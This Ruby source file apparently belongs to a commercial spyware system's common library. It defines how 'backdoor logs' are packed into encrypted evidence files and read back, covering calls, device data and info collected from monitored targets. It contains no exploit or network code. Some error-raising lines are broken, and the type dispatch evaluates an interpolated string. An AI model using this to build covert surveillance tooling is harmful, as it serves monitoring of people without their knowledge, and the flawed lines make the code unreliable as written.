#
# Evidence factory (backdoor logs)
#

require 'ffi'
require 'stringio'
require 'securerandom'
require 'rcs-common/crypt'
require 'rcs-common/time'
require 'rcs-common/utf16le'

# evidence types
require 'rcs-common/evidence/common'
require 'rcs-common/evidence/call'
require 'rcs-common/evidence/device'
require 'rcs-common/evidence/info'

module RCS

class EvidenceHeader < FFI::Struct
  layout :version, :uint32,
         :type,    :uint32,
         :time_h,  :uint32,
         :time_l,  :uint32,
         :deviceid_size, :uint32,
         :userid_size, :uint32,
         :sourceid_size, :uint32,
         :additional_size, :uint32
end

class Evidence
  
  extend Crypt
  include Crypt
  
  attr_reader :size
  attr_reader :binary
  attr_reader :content
  attr_reader :name
  attr_reader :timestamp
  attr_reader :info
  attr_reader :version
  attr_reader :type
  attr_reader :device_id
  attr_reader :source_id
  attr_reader :user_id
  
  def self.VERSION_ID
    2008121901
  end

  def initialize(key, info = {})
    @key = key
    info.each do |k,v|
      self.instance_variable_set("@#{k}", v)
    end
    @version = Evidence.VERSION_ID
  end
  
  def extend_on_type(type)
    extend instance_eval "#{type.to_s.capitalize}Evidence"
  end
  
  def extend_on_typeid(id)
    extend_on_type EVIDENCE_TYPES[id]
  end
  
  def generate_header
    thigh, tlow = @timestamp.to_filetime
    deviceid_utf16 = @device_id.to_utf16le_binary
    userid_utf16 = @user_id.to_utf16le_binary
    sourceid_utf16 = @source_id.to_utf16le_binary
    
    add_header = ''
    if respond_to? :additional_header
      add_header = additional_header
    end
    additional_size = add_header.size
    struct = [Evidence.VERSION_ID, type_id, thigh, tlow, deviceid_utf16.size, userid_utf16.size, sourceid_utf16.size, additional_size]
    header = struct.pack("I*")
    
    header += deviceid_utf16
    header += userid_utf16
    header += sourceid_utf16
    header += add_header
    
    return encrypt(header)
  end
  
  def align_to_block_len(len)
    rest = len % 16
    len += (16 - rest % 16) unless rest == 0
    len
  end
  
  def encrypt(data)
    rest = align_to_block_len(data.size) - data.size
    data += "a" * rest
    return aes_encrypt(data, @key, PAD_NOPAD)
  end
  
  def decrypt(data)
    return aes_decrypt(data, @key, PAD_NOPAD)
  end
  
  def append_data(data, len = data.size)
    [len].pack("I") + data
  end
  
  # factory to create a random evidence
  def generate(type)
    @name =  SecureRandom.hex(16)
    @timestamp = Time.now.utc
    @type = type
    
    # extend class on requested type
    extend_on_type @type
    
    # header
    @binary = append_data(generate_header)
    
    # content
    if respond_to? :generate_content
      chunks = generate_content
      chunks.each do | c |
        @binary += append_data( encrypt(c), c.size )
      end
    end
    
    return self
  end
  
  def size
    @binary.size
  end
  
  # save the file in the specified dir
  def dump_to_file(dir)
    # dump the file (using the @name) in the 'dir'
    File.open(dir + '/' + @name, "wb") do |f|
      f.write(@binary)
    end
  end
  
  # load an evidence from a file
  def load_from_file(file)
    # load the content of the file in @content
    # TODO: it could be even delayed at the first time @content is requested
    File.open(file, "rb") do |f|
      @binary = f.read
      @name = File.basename f
    end
    
    return self
  end
  
  def deserialize(data)
    
    raise EvidenceDeserializeError("no content!") if data.nil?
    
    @binary = data
    binary_string = StringIO.new @binary

    # header
    header_length = binary_string.read(4).unpack("I").shift
    header_string = StringIO.new decrypt(binary_string.read header_length)
    header_ptr = FFI::MemoryPointer.from_string header_string.read(EvidenceHeader.size)
    header = EvidenceHeader.new header_ptr

    # check that version is correct
    raise EvidenceDeserializeError("mismatching version") unless header[:version] == Evidence.VERSION_ID

    @timestamp = Time.from_filetime(header[:time_h], header[:time_l])
    @device_id = header_string.read(header[:deviceid_size]).force_encoding('UTF-16LE') unless header[:deviceid_size] == 0
    @user_id = header_string.read(header[:userid_size]).force_encoding('UTF-16LE') unless header[:userid_size] == 0
    @source_id = header_string.read(header[:sourceid_size]).force_encoding('UTF-16LE') unless header[:sourceid_size] == 0

    # extend class depending on evidence type
    begin
      @type = EVIDENCE_TYPES[ header[:type] ]
      extend_on_type @type
    rescue Exception => e
      raise EvidenceDeserializeError("unknown type")
    end
    
    if header[:additional_size] != 0
      additional_data = header_string.read header[:additional_size]
      decode_additional_header(additional_data) if respond_to? :decode_additional_header
    end
    
    # split content to chunks
    @content = ''
    while not binary_string.eof?
      len = binary_string.read(4).unpack("I").shift
      content = binary_string.read align_to_block_len(len)
      @content += StringIO.new( decrypt(content) ).read(len)
    end
    
    return self
  end
  
end

class EvidenceDeserializeError < StandardError
  attr_reader :msg
  def initialize(msg)
    @msg = msg
  end
end

end # RCS::
